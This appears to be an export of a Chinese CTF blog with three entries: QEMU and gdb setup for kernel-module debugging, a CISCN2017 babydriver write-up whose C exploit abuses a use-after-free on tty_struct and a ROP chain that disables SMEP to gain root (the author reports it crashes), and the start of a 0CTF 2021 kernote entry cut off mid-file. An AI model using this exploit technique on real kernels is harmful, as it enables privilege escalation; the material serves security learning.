<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ gedit init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">chmod</span> +x ./init</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br></pre></td></tr></table></figure>
<p><strong>启动内核</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ qemu-system-x86_64 -nographic -kernel ./linux-5.17.5/arch/x86/boot/bzImage -initrd ./rootfs.img -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 nokaslr&quot;</span> -smp cores=2,threads=1 -cpu kvm64</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">INIT SCRIPT</span><br><span class="line">Boot took 1.71 seconds</span><br><span class="line">/ $ [    1.718707] tsc: Refined TSC clocksource calibration: 2303.917 MHz</span><br><span class="line">[    1.719573] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2135a96e28b, max_idle_ns: 440795251144 ns</span><br><span class="line">[    1.721389] clocksource: Switched to clocksource tsc</span><br><span class="line"></span><br><span class="line">/ $ </span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">bin      etc      linuxrc  root     sys      usr</span><br><span class="line">dev      init     proc     sbin     tmp</span><br></pre></td></tr></table></figure>
<p>:warning: 这里按照 <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_10">CTF-wiki</a> 的写法我的QEMU跑不起来，将 <code>-m</code> 参数删除，猜测可能是内核版本过高，内存设置不足导致</p>
<h3 id="内核驱动编写与调试"><a href="#内核驱动编写与调试" class="headerlink" title="内核驱动编写与调试"></a>内核驱动编写与调试</h3><p><strong>驱动编写与编译</strong><br>在内核源码目录下构建文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">mkdir</span> mydriver</span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">cd</span> mydriver/</span><br></pre></td></tr></table></figure>
<p>在目录下构建驱动代码 <code>ko_test.c</code>，原封不动照抄</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Bye Bye~\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure>
<p>添加 <code>Makefile</code> 文件</p>
<figure class="highlight mk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定声称哪些 内核模块</span></span><br><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定内核项目路径</span></span><br><span class="line">KDIR =/home/embeded/Desktop/linux-5.17.5</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">        <span class="comment"># -C 参数指定进入内核项目路径</span></span><br><span class="line">        <span class="comment"># -M 指定驱动源码的环境，使 Makefile 在构建模块之前返回到 驱动源码 目录，并在该目录中生成驱动模块</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>
<p>进行编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5/mydriver$ make</span><br><span class="line">make -C /home/embeded/Desktop/linux-5.17.5/ M=/home/embeded/Desktop/linux-5.17.5/mydriver modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/home/embeded/Desktop/linux-5.17.5&#x27;</span></span><br><span class="line">  CC [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.o</span><br><span class="line">  MODPOST /home/embeded/Desktop/linux-5.17.5/mydriver/Module.symvers</span><br><span class="line">  CC [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.mod.o</span><br><span class="line">  LD [M]  /home/embeded/Desktop/linux-5.17.5/mydriver/ko_test.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/home/embeded/Desktop/linux-5.17.5&#x27;</span></span><br></pre></td></tr></table></figure>
<p>:warning:  <code>Makefile:9: *** missing separator (did you mean TAB instead of 8 spaces?).  Stop.</code><br>解决办法：vim 打开进行修改</p>
<p>:warning: <code>WARNING: Symbol version dump &quot;Module.symvers&quot; is missing. Modules may not have dependencies or modversions.</code><br>解决方式：回到内核源码目录，执行 <code>make -j 4 modules</code>，在编译模块的过程中，可以看到 <code>GEN     Module.symvers</code>，编译完成后重新编译自定义模块</p>
<p><strong>驱动运行</strong><br>将编译出来的 <code>*.ko</code> 文件复制到 rootfs 文件夹，即 <code>busybox*/_install</code>，修改运行脚本文件，提权运行并挂载模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">+ insmod /ko_test.ko <span class="comment"># 挂载内核模块</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">- setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">+ setsid /bin/cttyhack setuidgid 0 /bin/sh <span class="comment"># 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span><br><span class="line">+ poweroff -f <span class="comment"># 设置 shell 退出后则关闭机器</span></span><br></pre></td></tr></table></figure>
<p>重新打包 <code>rootfs</code> 并运行 <code>qemu</code>，查看 <code>dmesg</code> 信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[    2.159687] ko_test: loading out-of-tree module taints kernel.</span><br><span class="line">[    2.160878] ko_test: module verification failed: signature and/or required key missing - tainting kernel</span><br><span class="line">[    2.165558] This is a <span class="built_in">test</span> ko!</span><br><span class="line">Boot took 2.14 seconds</span><br><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure>

<p><strong>驱动调试：附加QEMU</strong><br>qemu 拥有调试接口，可以通过指定参数 <code>-gdb tcp::1234</code> 或等价符号 <code>-s</code>，如果希望 qemu 启动后立刻挂起，则需要指定 <code>-S</code></p>
<p>调试内核时为了加载 vmlinux 符号表，需要确保指定 <code>-append &quot;nokaslr&quot;</code>，否则无法给目标函数下断点<br>即模拟命令为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ qemu-system-x86_64 -s -S -nographic -kernel ./linux-5.17.5/arch/x86/boot/bzImage -initrd ./rootfs.img -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 nokaslr&quot;</span> -smp cores=2,threads=1 -cpu kvm64</span><br></pre></td></tr></table></figure>
<p>qemu 启动后另起终端，执行命令 <code>gdb -q -ex &quot;target remote localhost::1234&quot;</code> 即可附加到 QEMU 上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ gdb-gef -q -ex <span class="string">&quot;target remote localhost:1234&quot;</span></span><br></pre></td></tr></table></figure>
<p>通过添加符号表可以给特定函数下断点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  file ./vmlinux</span><br><span class="line">Reading symbols from ./vmlinux...done.</span><br><span class="line">gef➤  b start_kernel</span><br><span class="line">Breakpoint 1 at 0xffffffff831c7d55: file init/main.c, line 929.</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
<p>可以通过以下命令查看内核中的符号信息(加载地址)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line">ffffffff810d8410 T prepare_kernel_cred</span><br><span class="line">ffffffff826eda20 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff82713b4a r __kstrtab_prepare_kernel_cred</span><br><span class="line">ffffffff827189f9 r __kstrtabns_prepare_kernel_cred</span><br><span class="line">/ <span class="comment"># grep commit_creds  /proc/kallsyms</span></span><br><span class="line">ffffffff810d8160 T commit_creds</span><br><span class="line">ffffffff826e5884 r __ksymtab_commit_creds</span><br><span class="line">ffffffff82713b0a r __kstrtab_commit_creds</span><br><span class="line">ffffffff827189f9 r __kstrtabns_commit_creds</span><br><span class="line">/ <span class="comment"># grep ko_test_init  /proc/kallsyms</span></span><br><span class="line">ffffffffc0002000 t ko_test_init	[ko_test]</span><br></pre></td></tr></table></figure>

<p>装载模块和卸载模块的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># insmod mod_name</span></span><br><span class="line">/ <span class="comment"># rmmod mod_name</span></span><br></pre></td></tr></table></figure>

<p><strong>驱动调试：附加驱动</strong><br>在驱动装载进内核之后，首先查看已经加载的模块，并获取驱动加载的基地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br><span class="line">/ <span class="comment"># grep ko_test /proc/modules</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure>
<p>查看目标内核模块各个 <code>section</code> 的首地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># grep &quot;0x&quot; /sys/module/ko_test/sections/.*</span></span><br><span class="line">/sys/module/ko_test/sections/.gnu.linkonce.this_module:0xffffffffc0004000</span><br><span class="line">/sys/module/ko_test/sections/.note.Linux:0xffffffffc0003054</span><br><span class="line">/sys/module/ko_test/sections/.note.gnu.build-id:0xffffffffc0003000</span><br><span class="line">/sys/module/ko_test/sections/.rodata.str1.1:0xffffffffc0003024</span><br><span class="line">/sys/module/ko_test/sections/.strtab:0xffffffffc0007378</span><br><span class="line">/sys/module/ko_test/sections/.symtab:0xffffffffc0007000</span><br><span class="line">/sys/module/ko_test/sections/.text:0xffffffffc0002000</span><br></pre></td></tr></table></figure>

<p>在 gdb 窗口中加载调试符号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-symbol-file mydrivers/ko_test.ko &lt;ko_test_base_addr&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在此处，命令可以为</span></span><br><span class="line">gef➤  add-symbol-file mydriver/ko_test.ko 0xffffffffc0002000</span><br><span class="line">add symbol table from file <span class="string">&quot;mydriver/ko_test.ko&quot;</span> at</span><br><span class="line">	.text_addr = 0xffffffffc0002000</span><br><span class="line">Reading symbols from mydriver/ko_test.ko...done.</span><br></pre></td></tr></table></figure>

<p><strong>例子：nokaslr</strong><br>这里简单叙述一下调试 ko_test 模块函数的例子<br>首先，启动 QEMU 及 gdb<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061251955.png"><br>读取 vmlinux 符号表并继续执行<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061255929.png"><br>查看是否已经装载模块，及确认模块地址信息<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061302059.png"><br>在 gdb 调试界面按下 Ctrl+C 断下 kernel，并添加 ko_test 符号信息<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061305485.png"><br>在 ko_test 模块函数处下断点<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061307459.png"><br>继续运行 kernel，对 ko_test 进行卸载并重新装填，可以看到 gdb 会在断在模块函数处<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061309841.png"><br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061312650.png"></p>
<p>这里是利用 nokaslr 下相同驱动加载基地址不变的原理进行下断点</p>
<!-- **例子：kaslr**
如何在开始 ``kaslr`` 时调试 ``init`` 函数？
在模块被装填过程中，会调用 ``load_module`` 函数，在其内部会调用 ``do_init_module`` 函数对模块进行初始化,
其中 ``load_module`` 函数对应 SYSCALL 函数的 ``init_module`` 调用 

由于在 kernel 启用时会加载系统模块，先让 kernel 加载完毕，然后 Ctrl+C 断掉并在 ``do_init_module`` 处下断点，该函数前半部分会执行内核模块的 ``init`` 函数
![](https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061331847.png)
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * This is <span class="built_in">where</span> the real work happens.</span><br><span class="line"> *</span><br><span class="line"> * Keep it uninlined to provide a reliable breakpoint target, e.g. <span class="keyword">for</span> the gdb</span><br><span class="line"> * helper <span class="built_in">command</span> <span class="string">&#x27;lx-symbols&#x27;</span>.</span><br><span class="line"> */</span><br><span class="line">static noinline int do_init_module(struct module *mod)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  /* Start the module */</span><br><span class="line">  <span class="keyword">if</span> (mod-&gt;init != NULL)</span><br><span class="line">    ret = do_one_initcall(mod-&gt;init);   // &lt;- 此处执行 ko_test_init 函数</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; 0) &#123;</span><br><span class="line">    goto fail_free_freeinit;</span><br><span class="line">  &#125;</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>放开 kernel，加载模块，可以看到 gdb 断掉 –&gt;</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF linux kernel pwn 0 之 kernel bypass-smep</title>
    <url>/2022/05/12/CTF-linux-kernel-pwn-0-%E4%B9%8B-kernel-bypass-smep/</url>
    <content><![CDATA[<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>

<p>本文主要学习 Kernel bypass-smep 利用方式<br>题目以 CISCN2017 - babydrive 为例</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>本题主要开启了 SMEP 可以防止内核态访问用户空间代码</p>
<p>逆向伪代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret =  alloc_chrdev_region(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;babydev&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(ret &lt;<span class="number">0</span>)</span><br><span class="line">        printk(<span class="string">&quot;alloc chrdev region failed&quot;</span>)</span><br><span class="line">    cdev_init()</span><br><span class="line">    ret = cdev_add(babydev_no, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> ret &gt;= <span class="number">0</span></span><br><span class="line">        v5 = _class_create(<span class="string">&quot;babydev&quot;</span>, &amp;babydev_no)</span><br><span class="line">        <span class="keyword">if</span> (!v5)</span><br><span class="line">            printk(<span class="string">&quot;create class failed&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v7 = device_create(v5, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">&quot;babydev&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> !v7</span><br><span class="line">                printk(<span class="string">&quot;create devive failed&quot;</span>)</span><br><span class="line">                class_destroy(babydev_class)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        cdev_del()</span><br><span class="line">    printk(<span class="string">&quot;cdev init failed&quot;</span>)</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> babydriver_exit()</span><br><span class="line">&#123;</span><br><span class="line">    device_destroy(babydev_class, babydev_no);</span><br><span class="line">    class_destroy(babydev_class)</span><br><span class="line">    cdev_del(&amp;cdev_0);</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int64 <span class="title function_">babyioctl</span><span class="params">(file* filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> command == <span class="number">10001</span>h</span><br><span class="line">        kfree(babydev_strcut.device_buf);</span><br><span class="line">        device_buf = kmalloc(arg, <span class="number">0x24000C0</span>)</span><br><span class="line">        device_buf_len = arg</span><br><span class="line">        printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printk(<span class="string">&quot;args:   &quot;</span>)</span><br><span class="line">        result = <span class="number">-22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babyopen</span><span class="params">(inode *inode, file* filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    babyddev_strcut.device_buf = kmalloc(<span class="number">0x24000C0</span>L, <span class="number">64LL</span>)</span><br><span class="line">    babydev_struct.device_buf_len = <span class="number">64</span></span><br><span class="line">    printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babyrelease</span><span class="params">(inode *inode, file * filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    printk(<span class="string">&quot;device release\n&quot;</span>, filp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (!babydev_struct.device_buf)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; length)</span><br><span class="line">        retVal = length</span><br><span class="line">        copy_to_user(buffer);</span><br><span class="line">        result = retVal;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!babydev_struct.device_buf)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">if</span> (babydev_strcut.device_buf_len &gt; length)</span><br><span class="line">        retVal = length</span><br><span class="line">        copy_from_user();</span><br><span class="line">        result = retVal;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题内核版本为 4.4.72，是能够通过直接劫持 cred 结构体进行解决，但是如果内核版本提升，就无法直接进行劫持，所以可以考虑绕过 smep 在进行 ROP 操作</p>
<p>主要绕过和ROP代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>) get_root;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>; <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_tty_operations[i] = <span class="number">0xffffffff8181bfc5</span>; <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>; <span class="comment">//pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>) rop; </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_tty_operations;</span><br><span class="line">    write(fd2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//char buf[8] = &#123;0&#125;;</span></span><br><span class="line">    write(fd_tty, <span class="string">&quot;hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是从结果来看没有达到理想，运行结果如下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">./exp1</span><br><span class="line">[*] Start to exploit...</span><br><span class="line">[*]status has been saved.</span><br><span class="line">[    5.575253] device open</span><br><span class="line">[    5.576199] device open</span><br><span class="line">[    5.577136] alloc done</span><br><span class="line">[    5.578029] device release</span><br><span class="line">[    5.579662] traps: exp1[91] general protection ip:40fbe6 sp:7ffc206211d8 error:0 in exp1[400000+b7000]</span><br><span class="line">[    5.582778] exp1[90]: segfault at 7ffc206213d0 ip 00007ffc206213d0 sp 00007ffc20621388 error 15</span><br><span class="line">[    5.585234] device release</span><br><span class="line">[    5.586091] bad magic number for tty struct (5:2) in tty_release</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<p>通过调试知道在 swapgs 之后 pop rbp 会报错，但是至今没有找出来为什么会错</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>0CTF 2021 kernote</title>
    <url>/2022/05/06/0CTF-2021-kernote/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>
<p>题目资源获取链接：<a href="https://github.com/Darenfy/CTF-Chanllenge/tree/main/0CTF-2021-final/kernote">https://github.com/Darenfy/CTF-Chanllenge/tree/main/0CTF-2021-final/kernote</a></p>
<h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>获取题目解压后，查看文件信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bzImage  readme.md  rootfs.img  run.sh</span><br><span class="line"></span><br><span class="line">$ file *</span><br><span class="line">bzImage:    Linux kernel x86 boot executable bzImage, version 5.11.9 (yzloser@yzloser-rubbish) <span class="comment">#2 SMP Wed Sep 22 23:03:52 CST 2021, RO-rootFS, swap_dev 0x9, Normal VGA</span></span><br><span class="line">readme.md:  ASCII text</span><br><span class="line">rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=1a11479a-9bca-4c78-ae24-9c9c0b41d9f4 (extents) (64bit) (large files) (huge files)</span><br><span class="line">run.sh:     POSIX shell script, ASCII text executable</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> readme.md </span><br><span class="line">Here are some kernel config options <span class="keyword">in</span> <span class="keyword">case</span> you need it</span><br><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> run.sh </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-nographic \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-no-reboot \</span><br><span 